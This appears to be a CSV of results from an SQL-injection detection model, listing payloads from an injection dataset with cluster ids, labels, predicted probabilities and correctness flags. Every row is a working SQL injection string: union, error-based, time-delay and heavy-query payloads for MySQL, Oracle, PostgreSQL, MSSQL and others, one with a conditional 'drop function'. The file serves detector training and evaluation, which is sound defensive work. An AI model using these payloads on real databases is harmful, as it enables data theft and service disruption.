text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
1  )   where 1096  =  1096,sajid576/sql-injection-dataset,2427,1,1,0.9999864101409912,1
"1'+  (  select 'ovti' where 4243  =  4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",sajid576/sql-injection-dataset,2433,1,1,0.9999865293502808,1
1   )    )     )   and 9575  =  1640--,sajid576/sql-injection-dataset,2440,1,1,0.9999861717224121,1
select   (  case when   (  3672  =  8360  )   then 3672 else 3672*  (  select 3672 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,2452,1,1,0.9999864101409912,1
1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',sajid576/sql-injection-dataset,2465,1,1,0.9999862909317017,1
"1""  )   where 1833  =  1833",sajid576/sql-injection-dataset,2480,1,1,0.9999864101409912,1
"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",sajid576/sql-injection-dataset,2482,1,1,0.9999864101409912,1
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
"1'+  (  select zpns where 6922  =  6922 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",sajid576/sql-injection-dataset,2493,1,1,0.9999853372573853,1
"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,2502,1,1,0.9999864101409912,1
"1' where 6417  =  6417 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
"1'||  (  select 'kgfu' from dual where 2607  =  2607 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,2516,1,1,0.9999865293502808,1
"1'   )    )    as jpxj where 6153  =  6153 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,2526,1,1,0.9999866485595703,1
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,sajid576/sql-injection-dataset,2538,1,1,0.9999864101409912,1
select sleep  (  5  )   and    (    (   8679  =  8679,sajid576/sql-injection-dataset,2550,1,1,0.9999862909317017,1
"1'||  (  select 'kgjk' where 3530  =  3530 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,2558,1,1,0.9999865293502808,1
"1"" where 9521  =  9521 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",sajid576/sql-injection-dataset,2563,1,1,0.9999864101409912,1
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,276,1,1,0.9999865293502808,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""azzv"" like ""azzv",sajid576/sql-injection-dataset,2578,1,1,0.9999861717224121,1
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--,sajid576/sql-injection-dataset,2588,1,1,0.9999865293502808,1
"1'||  (  select 'ojdz' where 7350  =  7350 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",sajid576/sql-injection-dataset,2596,1,1,0.9999864101409912,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""bhmu"" like ""bhmu",sajid576/sql-injection-dataset,2609,1,1,0.9999864101409912,1
"1 where 2988  =  2988 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,2618,1,1,0.9999861717224121,1
"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""vlev"" like ""vlev",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
if  (  8995  =  9787  )   select 8995 else drop function ofgg--,sajid576/sql-injection-dataset,2629,1,1,0.999985933303833,1
-6757'   )    )     )   or 4524  =  3696,sajid576/sql-injection-dataset,2635,1,1,0.9999861717224121,1
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
1 where 4949  =  4949,sajid576/sql-injection-dataset,2648,1,1,0.9999858140945435,1
"1  )   where 7881  =  7881 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999862909317017,1
"1""   )    )    as tncm where 8203  =  8203 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sajid576/sql-injection-dataset,2657,1,1,0.9999865293502808,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,sajid576/sql-injection-dataset,2038,1,1,0.9999865293502808,1
1'||  (  select 'kptj' from dual where 5123  =  5123,sajid576/sql-injection-dataset,2670,1,1,0.9999862909317017,1
"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""hbgv""  =  ""hbgv",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""blkt"" like ""blkt",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",sajid576/sql-injection-dataset,2679,1,1,0.9999864101409912,1
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",sajid576/sql-injection-dataset,359,1,1,0.9999866485595703,1
"-9037%"" union all select 6583#",sajid576/sql-injection-dataset,2687,1,1,0.9999856948852539,1
"1%""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,2694,1,1,0.9999865293502808,1
"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # utdm",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",sajid576/sql-injection-dataset,2705,1,1,0.9999862909317017,1
1  )   as jdhz where 2021  =  2021,sajid576/sql-injection-dataset,2714,1,1,0.999985933303833,1
"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
1'  )   where 9516  =  9516,sajid576/sql-injection-dataset,2730,1,1,0.9999864101409912,1
-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm,sajid576/sql-injection-dataset,2742,1,1,0.9999866485595703,1
1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,812,1,1,0.9999866485595703,1
"1  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )",sajid576/sql-injection-dataset,379,1,1,0.9999861717224121,1
"1' in boolean mode  )   or elt  (  6272  =  6272,sleep  (  5   )    )   #",sajid576/sql-injection-dataset,2748,1,1,0.9999866485595703,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",sajid576/sql-injection-dataset,2755,1,1,0.9999865293502808,1
"1%'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
1'  )   where 5279  =  5279 or sleep  (  5  )  #,sajid576/sql-injection-dataset,2769,1,1,0.9999865293502808,1
1  )   as jtfx where 8038  =  8038,sajid576/sql-injection-dataset,2773,1,1,0.9999862909317017,1
"1 where 8905  =  8905 and make_set  (  7654  =  1923,1923  )  --",sajid576/sql-injection-dataset,2785,1,1,0.9999862909317017,1
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,812,1,1,0.9999865293502808,1
"1' where 2123  =  2123 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sajid576/sql-injection-dataset,2793,1,1,0.9999865293502808,1
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'akki'  =  'akki",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sajid576/sql-injection-dataset,2806,1,1,0.9999865293502808,1
"1"" where 9901  =  9901 and   (  2455  =  8499  )  *8499--",sajid576/sql-injection-dataset,2810,1,1,0.9999865293502808,1
"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""wfwg"" like ""wfwg",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
1%'   )    )    and 7989  =  3457,sajid576/sql-injection-dataset,2820,1,1,0.9999862909317017,1
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""regi"" like ""regi",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",sajid576/sql-injection-dataset,2833,1,1,0.9999865293502808,1
-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,sajid576/sql-injection-dataset,2846,1,1,0.9999865293502808,1
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'aovy'  =  'aovy",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
1 where 7516  =  7516 union all select null#,sajid576/sql-injection-dataset,2858,1,1,0.999985933303833,1
"-1079""  )   where 2865  =  2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",sajid576/sql-injection-dataset,2865,1,1,0.9999864101409912,1
-6015%'  )   order by 1--,sajid576/sql-injection-dataset,2870,1,1,0.9999858140945435,1
1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,276,1,1,0.9999864101409912,1
"-5959"" or 2477  =  1144",sajid576/sql-injection-dataset,2880,1,1,0.9999860525131226,1
if  (  6647  =  2179  )   select 6647 else drop function zvlq--,sajid576/sql-injection-dataset,2892,1,1,0.9999861717224121,1
1 where 1576  =  1576,sajid576/sql-injection-dataset,2909,1,1,0.999985933303833,1
"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,2913,1,1,0.9999861717224121,1
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""jhtc"" like ""jhtc",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
select   (  case when   (  7990  =  7627  )   then 7990 else 1/  (  select 0  )   end  )  --,sajid576/sql-injection-dataset,2921,1,1,0.9999865293502808,1
"select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--",sajid576/sql-injection-dataset,2933,1,1,0.9999861717224121,1
1'+  (  select rdwb where 2498  =  2498 and 3429  =  7639--,sajid576/sql-injection-dataset,2944,1,1,0.9999865293502808,1
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'gjja'  =  'gjja,sajid576/sql-injection-dataset,2955,1,1,0.9999865293502808,1
"1""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999862909317017,1
"1   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  9462  =  9462",sajid576/sql-injection-dataset,2966,1,1,0.9999860525131226,1
"1""  )   as obbk where 6414  =  6414 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""sfnj"" like ""sfnj",sajid576/sql-injection-dataset,2977,1,1,0.9999861717224121,1
select   (  case when   (  7385  =  8723  )   then 7385 else 7385*  (  select 7385 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,2988,1,1,0.9999864101409912,1
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )",sajid576/sql-injection-dataset,379,1,1,0.9999861717224121,1
waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,sajid576/sql-injection-dataset,2999,1,1,0.9999861717224121,1
"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,276,1,1,0.9999865293502808,1
1'  )   where 1369  =  1369 and 4840  =  1697#,sajid576/sql-injection-dataset,3012,1,1,0.9999866485595703,1
